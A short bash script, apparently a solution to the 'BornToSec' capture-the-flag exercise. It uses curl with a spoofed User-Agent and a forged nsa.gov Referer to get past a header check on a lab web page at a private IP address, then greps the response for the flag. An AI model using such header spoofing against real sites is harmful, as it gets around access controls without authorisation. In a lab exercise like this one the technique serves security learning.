#!/bin/bash

# Colors
RED='\e[91m'
GREEN='\e[92m'
RESET='\e[0m'

user_agent="ft_bornToSec"
referer="https://www.nsa.gov/"
target_url="http://192.168.56.101/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"

# Check if an IP address is provided as an argument
if [ "$#" -eq 1 ]; then
    target_url="http://$1/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
fi

result=$(curl -A "$user_agent" -e "$referer" "$target_url" | grep -o 'The flag[^<]*')

if [ -z "$result" ]; then
    echo -e "${RED}Flag not found.${RESET}"
else
    echo -e "${GREEN}$result${RESET}"
fi